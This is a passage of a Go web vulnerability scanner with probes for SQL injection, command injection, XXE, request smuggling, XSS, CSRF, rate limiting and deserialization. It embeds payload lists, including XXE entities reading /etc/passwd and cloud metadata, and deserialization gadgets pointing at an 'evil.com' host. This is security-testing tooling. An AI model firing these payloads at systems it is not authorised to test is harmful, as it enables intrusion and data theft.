	{"/sitemap.xml", "Sitemap", types.SeverityInfo},
	{"/wp-json/", "WordPress REST API", types.SeverityInfo},
	{"/backup", "Backup Directory", types.SeverityMedium},
	{"/backup.zip", "Backup Archive", types.SeverityHigh},
	{"/tmp/", "Temporary Files", types.SeverityMedium},
	{"/uploads/", "Uploads Directory", types.SeverityLow},
	{"/log/", "Log Directory", types.SeverityMedium},
	{"/logs/", "Logs Directory", types.SeverityMedium},
}

func checkExposedEndpoints(target string) ([]types.Finding, error) {
	var findings []types.Finding

	for _, ep := range exposedEndpointsList {
		u := strings.TrimRight(target, "/") + ep.path
		resp, err := sharedClient.Get(u)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == 200 {
			findings = append(findings, types.Finding{
				ID:          fmt.Sprintf("exposed-%s-%x", ep.path, sha256.Sum256([]byte(u)))[:24],
				Title:       fmt.Sprintf("Exposed Endpoint — %s", ep.label),
				Severity:    ep.severity,
				AffectedURL: u,
				CWE:         []string{"CWE-200"},
				OWASP2025:   "Security Misconfiguration",
				CVSS: func() float64 {
					if ep.severity == types.SeverityCritical { return 9.1 }
					if ep.severity == types.SeverityHigh { return 7.5 }
					if ep.severity == types.SeverityMedium { return 5.3 }
					return 0
				}(),
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
				Description: fmt.Sprintf("%s is publicly accessible. This exposes internal configuration, API structure, or administrative interfaces.", u),
				AttackScenario: fmt.Sprintf("1. Attacker discovers %s\n2. Extracts environment variables, API keys, or database credentials\n3. Uses exposed information for privilege escalation or data exfiltration", u),
				Evidence:     fmt.Sprintf("GET %s returned HTTP 200", u),
				Remediation:  "Restrict access to administrative and debug endpoints via IP allowlisting, authentication, or network-level controls. Remove sensitive files from production deployments.",
				ToolSource:   "custom-exposed-endpoints",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		}
	}

	return findings, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var sqliErrorPatterns = []struct {
	re  *regexp.Regexp
	db  string
}{
	{regexp.MustCompile(`(?i)(SQL syntax.*MySQL|You have an error in your SQL|Warning.*mysql_)`), "MySQL"},
	{regexp.MustCompile(`(?i)(PostgreSQL.*ERROR|psql:|unterminated quoted string)`), "PostgreSQL"},
	{regexp.MustCompile(`(?i)(ORA-\d{5}|Oracle error|PLS-\d{5})`), "Oracle"},
	{regexp.MustCompile(`(?i)(Microsoft OLE DB.*SQL Server|Unclosed quotation mark.*SQL Server|SQLServer.*Driver)`), "SQL Server"},
	{regexp.MustCompile(`(?i)(SQLite.*error|SQLITE_ERROR|near\s+["'][^"']*["']:\s*syntax)`), "SQLite"},
	{regexp.MustCompile(`(?i)(mariadb|MariaDB.*error)`), "MariaDB"},
}

var sqliParams = []string{"id", "user_id", "order_id", "item_id", "product_id", "page_id", "locId", "regId", "email", "username", "city", "category_id", "countryFilter[]"}

var sqliPayloads = []struct{ payload, technique string }{
	{"'", "single-quote probe"},
	{`"`, "double-quote probe"},
	{"' OR '1'='1", "tautology boolean"},
	{`' OR 1=1--`, "tautology comment"},
	{`' AND SLEEP(5)--`, "MySQL time-based blind"},
	{`' WAITFOR DELAY '0:0:5'--`, "SQL Server time-based blind"},
	{`' UNION SELECT 1,2,3--`, "UNION-based probe"},
	{"1' ORDER BY 100--", "ORDER BY column enum"},
}

func checkSQLi(target string) ([]types.Finding, error) {
	var findings []types.Finding
	endpoints := []string{target + "/", target + "/api/", target + "/v1/", target + "/product", target + "/user"}

	for _, ep := range endpoints {
		for _, param := range sqliParams {
			for _, payload := range sqliPayloads {
				u := fmt.Sprintf("%s?%s=%s", ep, param, payload.payload)
				resp, err := sharedClient.Get(u)
				if err != nil {
					continue
				}
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)
				for _, db := range sqliErrorPatterns {
					if db.re.MatchString(bodyStr) {
						match := db.re.FindString(bodyStr)
						findings = append(findings, types.Finding{
							ID:           fmt.Sprintf("sqli-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
							Title:        fmt.Sprintf("SQL Injection — %s Error Disclosure (%s)", db.db, payload.technique),
							Severity:     types.SeverityCritical,
							AffectedURL:  u,
							CWE:          []string{"CWE-89"},
							OWASP2025:    "Injection",
							CVSS:         9.1,
							CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
							Description:  fmt.Sprintf("SQL injection via %s parameter using %s. The application leaks %s database errors, confirming injectable input.", param, payload.technique, db.db),
							AttackScenario: fmt.Sprintf("1. Attacker sends %s\n2. %s DB error confirms injection\n3. UNION or blind techniques extract user data, hashes, or admin credentials", u, db.db),
							Evidence:     fmt.Sprintf("Payload: %s\nDB Error: %s\n\n%s", payload.payload, match, bodyStr[:min(len(bodyStr), 400)]),
							Remediation:  "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Implement input validation and WAF rules against SQL injection patterns.",
							ToolSource:   "custom-sqli",
							Timestamp:    time.Now(),
							Verified:     true,
						})
						break
					}
				}

				if payload.technique == "tautology boolean" && resp.StatusCode == 200 && len(bodyStr) > 100 {
					normalU := fmt.Sprintf("%s?%s=999999", ep, param)
					normalResp, nerr := sharedClient.Get(normalU)
					if nerr == nil {
						normalBody, _ := io.ReadAll(normalResp.Body)
						normalResp.Body.Close()
						normalLen := len(normalBody)
						if normalLen > 0 && float64(len(bodyStr)) > float64(normalLen)*1.5 {
							findings = append(findings, types.Finding{
								ID:           fmt.Sprintf("sqli-tauto-%x", sha256.Sum256([]byte(u)))[:24],
								Title:        fmt.Sprintf("Potential Blind SQL Injection — Boolean-based (%s)", param),
								Severity:     types.SeverityHigh,
								AffectedURL:  u,
								CWE:          []string{"CWE-89"},
								OWASP2025:    "Injection",
								CVSS:         8.6,
								CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
								Description:  fmt.Sprintf("Tautology payload via %s parameter returned significantly more data than the normal response. Indicative of blind boolean-based SQL injection.", param),
								AttackScenario: fmt.Sprintf("1. Normal request to %s?%s=999999 returns %d bytes\n2. Tautology 'OR 1=1' returns %d bytes\n3. Attacker uses boolean queries to extract data byte-by-byte", ep, param, normalLen, len(bodyStr)),
								Evidence:     fmt.Sprintf("Normal response: %d bytes\nTautology response: %d bytes (%.0f%% larger)", normalLen, len(bodyStr), float64(len(bodyStr)-normalLen)/float64(normalLen)*100),
								Remediation:  "Use parameterized queries. The application appears to concatenate user input into SQL queries.",
								ToolSource:   "custom-sqli",
								Timestamp:    time.Now(),
								Verified:     true,
							})
						}
					}
				}
			}
		}
	}

	return findings, nil
}

var csrfSensitiveEndpoints = []string{
	"/api/user/password", "/api/account/password", "/api/settings/password",
	"/api/user/email", "/api/account/email",
	"/api/user/delete", "/api/account/delete",
	"/api/apikey", "/api/api-key", "/api/token",
	"/api/admin", "/api/settings/admin",
}

var csrfTokenStrings = []string{
	"csrf", "xsrf", "_token", "authenticity_token", "nonce",
	"csrf_token", "xsrf_token", "__RequestVerificationToken",
}

func checkCSRF(target string) ([]types.Finding, error) {
	var findings []types.Finding

	for _, ep := range csrfSensitiveEndpoints {
		u := strings.TrimRight(target, "/") + ep
		req, err := http.NewRequest("POST", u, bytes.NewReader([]byte(`{}`)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := sharedClient.Do(req)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyStr := string(body)

		// Check for missing CSRF validation
		hasCSRF := false
		for _, token := range csrfTokenStrings {
			if strings.Contains(strings.ToLower(bodyStr), token) {
				hasCSRF = true
				break
			}
		}

		if resp.StatusCode == 200 && !hasCSRF && !strings.Contains(strings.ToLower(bodyStr), "unauthorized") && !strings.Contains(strings.ToLower(bodyStr), "forbidden") {
			findings = append(findings, types.Finding{
				ID:           fmt.Sprintf("csrf-%x", sha256.Sum256([]byte(u)))[:24],
				Title:        fmt.Sprintf("Potential CSRF — Missing Token on %s", ep),
				Severity:     types.SeverityMedium,
				AffectedURL:  u,
				CWE:          []string{"CWE-352"},
				OWASP2025:    "Broken Access Control",
				CVSS:         6.5,
				CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
				Description:  fmt.Sprintf("The endpoint %s responds with 200 to a POST without recognizable CSRF token validation. An attacker can forge requests to perform actions on behalf of authenticated users.", ep),
				AttackScenario: fmt.Sprintf("1. Attacker crafts HTML page with form targeting %s\n2. Authenticated victim visits page\n3. Form auto-submits, performing action without victim's knowledge", u),
				Evidence:     fmt.Sprintf("POST %s (no CSRF token sent)\nResponse: HTTP 200\n%s", u, bodyStr[:min(len(bodyStr), 300)]),
				Remediation:  "Implement CSRF tokens for all state-changing operations. Use SameSite=Strict or SameSite=Lax cookies. Validate Origin/Referer headers on sensitive endpoints.",
				ToolSource:   "custom-csrf",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		}
	}

	return findings, nil
}

var cmdInjectionPayloads = []struct{ payload, platform, indicator string }{
	{"; sleep 5", "Unix", ""},
	{"| sleep 5", "Unix", ""},
	{"`sleep 5`", "Unix", ""},
	{"$(sleep 5)", "Unix", ""},
	{"& sleep 5 &", "Unix", ""},
	{"; timeout 3 ping 127.0.0.1", "Unix", ""},
	{"| timeout 3 ping 127.0.0.1", "Unix", ""},
}

var cmdInjectionParams = []string{"cmd", "command", "exec", "execute", "run", "shell", "ping", "host", "ip", "domain", "target", "addr", "address"}

func checkCommandInjection(target string) ([]types.Finding, error) {
	var findings []types.Finding
	endpoints := []string{target + "/", target + "/api/", target + "/v1/", target + "/admin", target + "/ping"}

	for _, ep := range endpoints {
		for _, param := range cmdInjectionParams {
			for _, payload := range cmdInjectionPayloads {
				u := fmt.Sprintf("%s?%s=%s%s", ep, param, "test", url.QueryEscape(payload.payload))
				start := time.Now()
				resp, err := sharedClient.Get(u)
				elapsed := time.Since(start)
				if err != nil {
					if strings.Contains(err.Error(), "timeout") {
						continue
					}
					continue
				}
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				_ = body

				if strings.Contains(payload.payload, "sleep") && elapsed > 4*time.Second {
					findings = append(findings, types.Finding{
						ID:           fmt.Sprintf("cmd-inj-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
						Title:        fmt.Sprintf("Command Injection — Time-based (%s, %s)", param, payload.platform),
						Severity:     types.SeverityCritical,
						AffectedURL:  u,
						CWE:          []string{"CWE-78"},
						OWASP2025:    "Injection",
						CVSS:         9.8,
						CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						Description:  fmt.Sprintf("Command injection via %s parameter. The %s payload caused the server response to be delayed by %.0f seconds, confirming code execution.", param, payload.platform, elapsed.Seconds()),
						AttackScenario: fmt.Sprintf("1. Attacker injects %s into %s parameter\n2. Server executes the injected command (%ds delay confirms execution)\n3. Attacker escalates to reverse shell or data exfiltration", payload.payload, param, int(elapsed.Seconds())),
						Evidence:     fmt.Sprintf("Payload: %s\nResponse time: %.0fs (expected <1s)", payload.payload, elapsed.Seconds()),
						Remediation:  "Never pass user input to shell/command execution functions. Use exec with explicit argument arrays, not shell interpretation. Validate and sanitize all input against an allowlist.",
						ToolSource:   "custom-cmd-injection",
						Timestamp:    time.Now(),
						Verified:     true,
					})
				}
			}
		}
	}

	return findings, nil
}

var xxePayloads = []struct {
	contentType string
	body        string
	label       string
}{
	{
		"application/xml",
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,
		"file:///etc/passwd",
	},
	{
		"application/xml",
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>`,
		"SSRF via XXE to AWS metadata",
	},
	{
		"application/xml",
		`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>`,
		"expect:// RCE probe",
	},
}

var xxeEndpoints = []string{"/api/xml", "/api/import", "/api/upload", "/api/soap", "/api/transform", "/xml", "/api/parse", "/api/process"}

func checkXXE(target string) ([]types.Finding, error) {
	var findings []types.Finding

	for _, ep := range xxeEndpoints {
		u := strings.TrimRight(target, "/") + ep
		for _, payload := range xxePayloads {
			req, err := http.NewRequest("POST", u, bytes.NewReader([]byte(payload.body)))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", payload.contentType)

			resp, err := sharedClient.Do(req)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "daemon:") ||
				(strings.Contains(bodyStr, "ami-id") && payload.label == "SSRF via XXE to AWS metadata") {
				findings = append(findings, types.Finding{
					ID:           fmt.Sprintf("xxe-%x", sha256.Sum256([]byte(u+payload.label)))[:24],
					Title:        fmt.Sprintf("XXE Injection — %s", payload.label),
					Severity:     types.SeverityCritical,
					AffectedURL:  u,
					CWE:          []string{"CWE-611"},
					OWASP2025:    "Security Misconfiguration",
					CVSS:         9.1,
					CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
					Description:  fmt.Sprintf("XXE injection at %s using %s payload. The XML parser resolves external entities, enabling file reads or SSRF.", u, payload.label),
					AttackScenario: fmt.Sprintf("1. Attacker sends XXE payload to %s\n2. XML parser resolves external entity (%s)\n3. Sensitive files, credentials, or internal services are exposed", u, payload.label),
					Evidence:     fmt.Sprintf("Payload: %s\nResponse contained: %s", payload.body[:min(len(payload.body), 200)], bodyStr[:min(len(bodyStr), 300)]),
					Remediation:  "Disable external entity resolution in XML parsers. Configure DocumentBuilderFactory/SAXParserFactory to disallow DOCTYPE declarations. Consider using JSON instead of XML.",
					ToolSource:   "custom-xxe",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			}
		}
	}

	return findings, nil
}

func checkHTTPSmuggling(target string) ([]types.Finding, error) {
	var findings []types.Finding
	hostname := strings.TrimPrefix(strings.TrimPrefix(target, "https://"), "http://")
	hostname = strings.Split(hostname, "/")[0]

	desyncTests := []struct {
		label string
		body  string
	}{
		{
			"CL.TE desync",
			fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGPOST / HTTP/1.1\r\nHost: %s\r\n\r\n", hostname, hostname),
		},
		{
			"TE.CL desync",
			fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: %s\r\n\r\n0\r\n\r\n", hostname, hostname),
		},
	}

	for _, test := range desyncTests {
		parsedURL, err := url.Parse(target)
		if err != nil {
			continue
		}
		host := parsedURL.Host
		if !strings.Contains(host, ":") {
			if parsedURL.Scheme == "https" {
				host += ":443"
			} else {
				host += ":80"
			}
		}

		conn, err := net.DialTimeout("tcp", host, 5*time.Second)
		if err != nil {
			continue
		}
		conn.SetDeadline(time.Now().Add(3 * time.Second))
		conn.Write([]byte(test.body))
		var response [4096]byte
		conn.Read(response[:])
		conn.Close()

		responseStr := string(response[:])
		if strings.Contains(responseStr, "GPOST") ||
			(strings.Contains(responseStr, "HTTP/1.1 4") && strings.Count(responseStr, "HTTP/1.1") > 1) {
			findings = append(findings, types.Finding{
				ID:           fmt.Sprintf("smuggle-%x", sha256.Sum256([]byte(test.label+target)))[:24],
				Title:        fmt.Sprintf("HTTP Request Smuggling — %s", test.label),
				Severity:     types.SeverityHigh,
				AffectedURL:  target,
				CWE:          []string{"CWE-444"},
				OWASP2025:    "Injection",
				CVSS:         7.5,
				CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
				Description:  fmt.Sprintf("Potential %s desync on %s. The server appears to have inconsistent handling of Transfer-Encoding and Content-Length headers, enabling request smuggling.", test.label, target),
				AttackScenario: fmt.Sprintf("1. Attacker sends ambiguous request using %s technique\n2. Front-end and back-end disagree on request boundaries\n3. Smuggled GPOST request is queued, poisoning subsequent users' requests", test.label),
				Evidence:     fmt.Sprintf("Sent: %s\nResponse: %s", test.body[:min(len(test.body), 300)], responseStr[:min(len(responseStr), 500)]),
				Remediation:  "Ensure consistent HTTP parsing between front-end (load balancer/CDN) and back-end. Use HTTP/2 to avoid Transfer-Encoding ambiguity. Reject requests with both CL and TE headers.",
				ToolSource:   "custom-http-smuggling",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		}
	}

	return findings, nil
}

var xssPayloads = []struct {
	payload  string
	vector   string
	severity types.Severity
}{
	{`<script>alert(1)</script>`, "Basic script tag", types.SeverityHigh},
	{`<img src=x onerror=alert(1)>`, "IMG onerror", types.SeverityHigh},
	{`<svg onload=alert(1)>`, "SVG onload", types.SeverityHigh},
	{`<body onload=alert(1)>`, "Body onload", types.SeverityHigh},
	{`"><script>alert(1)</script>`, "Attribute break-out", types.SeverityHigh},
	{`'-alert(1)-'`, "Single-quote break-out", types.SeverityHigh},
	{`%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`, "URL-encoded script", types.SeverityHigh},
	{`{{constructor.constructor('alert(1)')()}}`, "SSTI-like XSS (Angular Vue)", types.SeverityHigh},
	{`javascript:alert(1)`, "JavaScript URL scheme", types.SeverityMedium},
	{`<iframe src="javascript:alert(1)">`, "Iframe javascript", types.SeverityHigh},
}

var xssParams = []string{"q", "query", "search", "id", "url", "redirect_uri", "utm_source", "name", "email",
	"message", "comment", "title", "description", "bio", "username", "display_name",
	"callback", "jsonp", "input", "value", "text", "content"}

func checkXSSProbes(target string) ([]types.Finding, error) {
	var findings []types.Finding
	endpoints := []string{
		target + "/",
		target + "/search",
		target + "/api/search",
		target + "/login",
		target + "/register",
		target + "/contact",
		target + "/api/",
		target + "/v1/",
	}

	for _, ep := range endpoints {
		for _, param := range xssParams {
			for _, xp := range xssPayloads {
				u := fmt.Sprintf("%s?%s=%s", ep, param, url.QueryEscape(xp.payload))
				resp, err := sharedClient.Get(u)
				if err != nil {
					continue
				}
				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)

				// Check if payload is reflected exactly
				if strings.Contains(bodyStr, xp.payload) {
					findings = append(findings, types.Finding{
						ID:           fmt.Sprintf("xss-%s-%x", param, sha256.Sum256([]byte(u)))[:24],
						Title:        fmt.Sprintf("Reflected XSS — %s via %s parameter", xp.vector, param),
						Severity:     xp.severity,
						AffectedURL:  u,
						CWE:          []string{"CWE-79"},
						OWASP2025:    "Injection",
						CVSS:         6.1,
						CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
						Description:  fmt.Sprintf("Reflected XSS via %s parameter. The %s payload is reflected in the response without sanitization, enabling script execution in the victim's browser.", param, xp.vector),
						AttackScenario: fmt.Sprintf("1. Attacker crafts URL with XSS payload: %s\n2. Sends link to victim\n3. Victim opens link, malicious script executes in their browser session", u),
						Evidence:     fmt.Sprintf("Payload %s reflected verbatim in:\n%s", xp.payload, bodyStr[:min(len(bodyStr), 400)]),
						Remediation:  "HTML-encode all user input before rendering. Use Content-Security-Policy headers. Implement context-aware output encoding (HTML, JS, URL, CSS).",
						ToolSource:   "custom-xss",
						Timestamp:    time.Now(),
						Verified:     true,
					})
				}
			}
		}
	}

	return findings, nil
}

var rateLimitEndpoints = []struct {
	path       string
	method     string
	threshold  int
	label      string
}{
	{"/login", "POST", 20, "Login"},
	{"/api/login", "POST", 20, "API Login"},
	{"/register", "POST", 20, "Registration"},
	{"/api/register", "POST", 20, "API Registration"},
	{"/forgot-password", "POST", 20, "Forgot Password"},
	{"/api/forgot-password", "POST", 20, "API Forgot Password"},
	{"/reset-password", "POST", 20, "Password Reset"},
	{"/api/reset-password", "POST", 20, "API Password Reset"},
	{"/otp/verify", "POST", 20, "OTP Verification"},
	{"/api/otp/verify", "POST", 20, "API OTP Verification"},
	{"/2fa/verify", "POST", 20, "2FA Verification"},
	{"/api/2fa/verify", "POST", 20, "API 2FA Verification"},
}

func checkRateLimiting(target string) ([]types.Finding, error) {
	var findings []types.Finding

	for _, ep := range rateLimitEndpoints {
		u := strings.TrimRight(target, "/") + ep.path
		start := time.Now()
		successes := 0
		totalSent := 0

		for i := 0; i < ep.threshold && time.Since(start) < 15*time.Second; i++ {
			var req *http.Request
			var err error
			if ep.method == "POST" {
				req, err = http.NewRequest("POST", u, bytes.NewReader([]byte(`{"test":"true"}`)))
			} else {
				req, err = http.NewRequest("GET", u, nil)
			}
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/json")
			resp, err := sharedClient.Do(req)
			if err != nil {
				continue
			}
			totalSent++
			if resp.StatusCode == 429 {
				resp.Body.Close()
				break
			}
			if resp.StatusCode == 200 || resp.StatusCode == 302 || resp.StatusCode == 401 {
				successes++
			}
			resp.Body.Close()
			time.Sleep(50 * time.Millisecond)
		}

		ratio := float64(successes) / float64(totalSent)
		if totalSent >= 10 && ratio > 0.8 && totalSent >= ep.threshold/2 {
			findings = append(findings, types.Finding{
				ID:           fmt.Sprintf("ratelimit-%x", sha256.Sum256([]byte(u)))[:24],
				Title:        fmt.Sprintf("Missing Rate Limiting — %s (%d/%d requests succeeded)", ep.label, successes, totalSent),
				Severity:     types.SeverityMedium,
				AffectedURL:  u,
				CWE:          []string{"CWE-307"},
				OWASP2025:    "Identification and Authentication Failures",
				CVSS:         5.3,
				CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
				Description:  fmt.Sprintf("The %s endpoint at %s does not enforce rate limiting. %d of %d rapid requests succeeded without receiving a 429 (Too Many Requests). An attacker can brute-force credentials or abuse the endpoint.", ep.label, u, successes, totalSent),
				AttackScenario: fmt.Sprintf("1. Attacker sends %d rapid requests to %s\n2. No rate limiting is enforced (%d succeeded)\n3. Attacker brute-forces user credentials, OTPs, or password reset tokens", totalSent, u, successes),
				Evidence:     fmt.Sprintf("Sent %d requests in %.0fs\nResponses: %d succeeded (2xx/3xx), %d rate-limited (429)", totalSent, time.Since(start).Seconds(), successes, totalSent-successes),
				Remediation:  "Implement rate limiting (e.g., 5 requests per minute per IP for login/reset endpoints). Apply progressive delays, CAPTCHA after threshold, and account lockout policies. Use 429 status codes with Retry-After headers.",
				ToolSource:   "custom-rate-limiting",
				Timestamp:    time.Now(),
				Verified:     true,
			})
		}
	}

	return findings, nil
}

var deserializationPayloads = []struct {
	contentType string
	body        string
	label       string
	indicator   string
	severity    types.Severity
}{
	{
		"application/x-java-serialized-object",
		"\xac\xed\x00\x05\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70",
		"Java serialized object",
		"class java.util",
		types.SeverityCritical,
	},
	{
		"application/php-serialized",
		`O:8:"stdClass":0:{}`,
		"PHP serialized object",
		"__PHP_Incomplete_Class",
		types.SeverityCritical,
	},
	{
		"application/python-pickle",
		string([]byte{0x80, 0x04, 0x95}),
		"Python pickle (v4 protocol)",
		"S'",
		types.SeverityCritical,
	},
	{
		"application/yaml",
		`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com"]]]]`,
		"Java YAML deserialization (SnakeYAML)",
		"ScriptEngineManager",
		types.SeverityCritical,
	},
	{
		"application/json",
		`{"object":["something",{"@class":"java.net.URL","val":"http://evil.com"}]}`,
		"JSON deserialization gadget",
		"@class",
		types.SeverityCritical,
	},
	{
		"application/xml",
		`<java>\x3Cobject class="java.lang.ProcessBuilder">\x3Carray class="java.lang.String" length="1">\x3Cvoid index="0">\x3Cstring>id\x3C/string>\x3C/void>\x3C/array>\x3Cvoid method="start">\x3C/object>\x3C/java>`,
		"Java XStream deserialization RCE",
		"ProcessBuilder",
		types.SeverityCritical,
	},
	{
		"application/ruby-marshal",
		string([]byte{0x04, 0x08, 0x6f, 0x3a, 0x08, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00}),
		"Ruby Marshal object",
		"Object",
		types.SeverityCritical,
	},
	{
		"application/x-www-form-urlencoded",
		`value=O:8:"stdClass":0:{}`,
		"PHP deserialization in form data",
		"__PHP_Incomplete_Class",
		types.SeverityCritical,
	},
}

var deserEndpoints = []string{
	"/api/deserialize", "/api/process", "/api/import", "/api/upload",
	"/api/transform", "/api/load", "/api/parse", "/api/convert",
	"/api/rpc", "/api/soap", "/api/rest", "/api/data",
	"/api/batch", "/api/bulk",
}

func checkDeserialization(target string) ([]types.Finding, error) {
	var findings []types.Finding

	for _, ep := range deserEndpoints {
		u := strings.TrimRight(target, "/") + ep
		for _, payload := range deserializationPayloads {
			req, err := http.NewRequest("POST", u, bytes.NewReader([]byte(payload.body)))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", payload.contentType)

			resp, err := sharedClient.Do(req)
			if err != nil {
				continue
			}
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			if resp.StatusCode == 500 &&
				(strings.Contains(strings.ToLower(bodyStr), "serializ") ||
				 strings.Contains(strings.ToLower(bodyStr), "deserializ") ||
				 strings.Contains(strings.ToLower(bodyStr), "class") ||
				 strings.Contains(strings.ToLower(bodyStr), "exception") ||
				 strings.Contains(strings.ToLower(bodyStr), payload.indicator)) {
				findings = append(findings, types.Finding{
					ID:           fmt.Sprintf("deser-%x", sha256.Sum256([]byte(u+payload.label)))[:24],
					Title:        fmt.Sprintf("Potential Insecure Deserialization — %s", payload.label),
					Severity:     payload.severity,
					AffectedURL:  u,
					CWE:          []string{"CWE-502"},
					OWASP2025:    "Software and Data Integrity Failures",
					CVSS:         9.8,
					CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Description:  fmt.Sprintf("The endpoint %s processes %s payloads and returns a 500 error with deserialization-related messages. This indicates the server may be vulnerable to deserialization attacks leading to RCE.", u, payload.label),
					AttackScenario: fmt.Sprintf("1. Attacker sends crafted %s payload to %s\n2. Server deserializes the payload (500 error confirms deserialization)\n3. RCE gadget chain executes arbitrary commands on server", payload.label, u),
					Evidence:     fmt.Sprintf("Content-Type: %s\nResponse status: 500\nResponse body: %s", payload.contentType, bodyStr[:min(len(bodyStr), 400)]),
					Remediation:  "Never deserialize untrusted data. Use safe serialization formats (JSON/Protobuf). If required, use whitelist-based type resolution and validate all input before deserialization. Apply CVE patches for known deserialization libraries (Jackson, SnakeYAML, XStream).",
					ToolSource:   "custom-deserialization",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			} else if resp.StatusCode == 200 &&
				(strings.Contains(strings.ToLower(bodyStr), "object") ||
				 strings.Contains(strings.ToLower(bodyStr), payload.indicator)) {
				findings = append(findings, types.Finding{
					ID:           fmt.Sprintf("deser-200-%x", sha256.Sum256([]byte(u+payload.label)))[:24],
					Title:        fmt.Sprintf("Insecure Deserialization Confirmed — %s", payload.label),
					Severity:     types.SeverityCritical,
					AffectedURL:  u,
					CWE:          []string{"CWE-502"},
					OWASP2025:    "Software and Data Integrity Failures",
					CVSS:         9.8,
					CVSSVector:   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Description:  fmt.Sprintf("%s deserialized successfully at %s. The server accepted and processed the payload indicating no input validation. This is exploitable for RCE.", payload.label, u),
					AttackScenario: fmt.Sprintf("1. Attacker sends %s payload to %s\n2. Server successfully deserializes it\n3. Crafted gadget chain achieves RCE on the application server", payload.label, u),
					Evidence:     fmt.Sprintf("Content-Type: %s\nResponse status: 200 (Accepted)\nIndicates deserialization succeeded", payload.contentType),
					Remediation:  "Disable deserialization of untrusted input immediately. Implement strict type validation. Use alternative serialization formats like JSON with known schemas.",
					ToolSource:   "custom-deserialization",
					Timestamp:    time.Now(),
					Verified:     true,
				})
			}
		}
	}

	return findings, nil
}

func extractJSUrls(html, baseURL string) []string {
	re := regexp.MustCompile(`<script[^>]*src\s*=\s*["']([^"']+)["']`)
	matches := re.FindAllStringSubmatch(html, -1)
	var urls []string
	seen := make(map[string]bool)
	for _, m := range matches {
		u := m[1]
		switch {
		case strings.HasPrefix(u, "//"):
			u = "https:" + u
		case strings.HasPrefix(u, "/"):
			base := strings.TrimRight(baseURL, "/")
			u = base + u
		case !strings.HasPrefix(u, "http"):
			base := strings.TrimRight(baseURL, "/")
			u = base + "/" + u
		}
		if !seen[u] {
			seen[u] = true
			urls = append(urls, u)
		}
	}
	return urls
}
